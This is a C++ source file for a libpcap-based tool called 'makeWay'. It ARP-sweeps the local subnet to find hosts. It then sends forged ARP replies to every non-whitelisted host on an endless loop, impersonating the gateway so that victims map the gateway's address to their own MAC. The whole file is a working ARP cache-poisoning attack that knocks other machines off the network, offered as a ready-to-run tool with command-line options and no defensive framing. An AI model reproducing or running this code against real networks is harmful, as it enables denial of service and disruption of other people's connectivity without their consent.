#include <pcap.h>  /* GIMME a libpcap plz! */
#include <iostream>
#include <vector>
#include <map>
#include <inttypes.h>

//custom functions...
#include "util.h"
#include "ArpFactory.h"
#include "NetworkInterface.h"

#define VERSION 1.1

using namespace std;
time_t lastAdded;

void arpListener(u_char *argv,const struct pcap_pkthdr* pkthdr,const u_char* packet){
  
  struct ether_hdr *eptr = (struct ether_hdr *) packet;
  struct pcapLoopHandler *handler = (struct pcapLoopHandler *) argv;

  if ( eptr->h_proto == htons(ARP_PROTO) ){    
    //get arp packet
    struct arp_hdr *aptr =(arp_hdr*) (packet + sizeof(struct ether_hdr));    

    Host host;
    host.ip = IPtoString(aptr->src_ip);
    host.mac = MACtoString( aptr->src_mac );
    
    bool found = false;
    for(unsigned int i=0; i< handler->targetList.size(); i++){
      Host h = handler->targetList.at(i);
      if (h.ip.compare(host.ip) == 0 )	
	found = true;
    }
    
    if ( found == false ){
      cout<< "[+] " << host.ip << " is at " << host.mac <<endl;
      lastAdded = time (NULL);
      handler->targetList.push_back(host);      
    }    
    
    time_t t = time (NULL);
    time_t elapsed = (t - lastAdded );
    if ( elapsed > 1 ){
      pcap_breakloop( handler->ph );
    }
  }
}

void arpSweep( pcap_t *ph , ArpFactory &arpFactory ,
	       string localMAC , string localIP , vector<Host> &targetList ){
  cout<< "[+] Finding Hosts"  <<endl;    

  uint8_t lcl_mac[6] = {0x01, 0x14, 0xcc, 0x94, 0x7f, 0xf1};
  StringtoMAC( localMAC , lcl_mac );

  uint8_t src_ip[4] = {0, 0, 0, 0};
  StringtoIP( localIP , src_ip );

  pid_t  pid;
  pid = fork();
  if (pid == 0) {
    //child
    uint8_t tgt_ip[4] = {0, 0, 0, 0};
    StringtoIP( localIP , tgt_ip );
    uint8_t tgt_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for(int i = 0; i<255 ; i++ ){
      tgt_ip[3] = i;
      
      arpFactory.setEthMAC( lcl_mac , tgt_mac );
      arpFactory.setArpOpCode( ARP_REQUEST );
      arpFactory.setArpIP( src_ip , tgt_ip );
      arpFactory.setArpMAC( lcl_mac , tgt_mac );
      
      char *npacket = arpFactory.create();
      pcap_inject
	(ph, npacket, sizeof(struct ether_hdr) + sizeof(struct arp_hdr));
    }    

    exit(0);
  }else {
    //paren    
    struct pcapLoopHandler handler;
    //(struct pcapLoopHandler*)malloc(sizeof(pcapLoopHandler));
    handler.arpListenerRunningFor = time (NULL);
    handler.ph = ph;
    handler.targetList = targetList;

    pcap_loop( ph , -1 , arpListener , (u_char*) &handler);    
    targetList = handler.targetList;
  }
}

map<string,string> parseCommandLineArguments(int argc,
			       char **argv,
			       vector<string> &whiteList ){    
  if ( argc <= 1 ){
    cout<< "makeWay v " << VERSION <<endl;
    cout<< "usage: interface [scan] [ whiteListIPs ] " <<endl;    
    exit(0);
  }  

  //parse command line arguments
  map<string,string> options;
  
  string interface(argv[1]);  
  options["interface"] = interface;  
  options["injectInterval"] = "3";
  
  //cout<< argc <<endl;
  
  if (argc > 2 ){    
    string scan(argv[2]);  
    if (scan.compare("scan") == 0 ){
      options["scan"] = "true";
      options["injectInterval"] = "3";
      return options;
    }else{
      options["scan"] = "false";
    }

    //check for timing
    string time(argv[2]);
    int indexOfWhiteList = 2;
    if (scan.compare("-t") == 0 ){
      options["injectInterval"] = argv[3];
      indexOfWhiteList+=2;
    }
  
    if ( argc >= indexOfWhiteList ){
      cout<< "[+] Adding Whitelisted IPs" << endl;
      for( int i = indexOfWhiteList ; i < argc ; i++ ){
	string ip(argv[i]);
	whiteList.push_back( ip );
	cout<< "[+] Added " << ip  <<endl;      
      }
    }
  }
  
  return options;
}


int main(int argc, char **argv){
  pcap_t *ph;
  int ret;   /* return code */
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 netp; /* ip          */
  bpf_u_int32 maskp;/* subnet mask */
  ArpFactory arpFactory;  
  vector<string> whiteList;
  vector<Host> targetList;
  map<string,string> options = parseCommandLineArguments( argc, argv , whiteList );

  //get which interface to use
  string interface = options["interface"];
  char dev[interface.size() ]; //device to use
  for(unsigned int i = 0; i< interface.size(); i++ )
    dev[i] = interface[i];
  dev[interface.size()] = '\0';

  NetworkInterface networkInterface(dev);

  string gatewayIP = networkInterface.getLocalGateway();
  string localMac = networkInterface.getLocalMAC();
  string localIP = networkInterface.getLocalIP();

  int injectInterval = parseInt( options["injectInterval"] );
  cout<< "[+] Gateway IP " << gatewayIP <<endl;
  cout<< "[+] Local MAC " << localMac <<endl;
  cout<< "[+] Local IP " << localIP <<endl;
  cout<< "[+] Inject Interval " << injectInterval << " Seconds" <<endl;

  //do not poison self and gateway
  whiteList.push_back(gatewayIP);
  whiteList.push_back(localIP);

  
  /* print out device name */
  printf("[+] Using Interface %s\n",dev);
  /* ask pcap for the network address and mask of the device */
  ret = pcap_lookupnet(dev,&netp,&maskp,errbuf);
  if(ret == -1) {
    printf("%s\n",errbuf);
    exit(1);
  }

  cout<< "[+] Opening Device" <<endl;  
  ph = pcap_open_live(dev, BUFSIZ, 1, 10000, errbuf);
  if(ph == NULL) { 
    printf("pcap_open_live(): %s\n",errbuf); exit(1); 
  }

  arpSweep( ph , arpFactory , localMac , localIP , targetList );
  cout<< "[+] Found " << targetList.size() << " hosts." <<endl;

  if (options["scan"].compare("true") == 0 )
    exit(0);
  

  cout<< "[+] Injecting Package"  <<endl;
  uint8_t lcl_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  StringtoMAC( localMac , lcl_mac);  

  uint8_t src_ip[4] = {0, 0, 0, 0};
  StringtoIP( gatewayIP , src_ip );

  vector<char *> packetList;
  for( unsigned int i = 0; i<targetList.size() ; i++ ){
    //create custom arp packets for target
    Host host = targetList.at(i);

    bool found = false;
    for(unsigned int m = 0; m<whiteList.size(); m++ ){
      if ( host.ip.compare( whiteList.at(m) ) == 0 ){
	found = true;
      }
    }
    if (found == true )
      continue;

    uint8_t tgt_ip[4] = {0, 0, 0, 0};
    StringtoIP( host.ip , tgt_ip );
    
    uint8_t tgt_mac[6] = {0x01, 0x14, 0xcc, 0x94, 0x7f, 0xf1};
    StringtoMAC( host.mac , tgt_mac );
    
    arpFactory.setEthMAC( lcl_mac , tgt_mac );
    arpFactory.setArpOpCode( ARP_REPLY );
    arpFactory.setArpIP( src_ip , tgt_ip );
    arpFactory.setArpMAC( tgt_mac , tgt_mac );

    char *npacket = arpFactory.create();    
    packetList.push_back(npacket);
  }

  while(true){
    
    for(unsigned int i=0; i<packetList.size() ; i++){
      char* packet = packetList.at(i);

      pcap_inject
	(ph, packet, sizeof(struct ether_hdr) + sizeof(struct arp_hdr));      
    }    
    sleep( injectInterval );
  }  
  return 0;
}
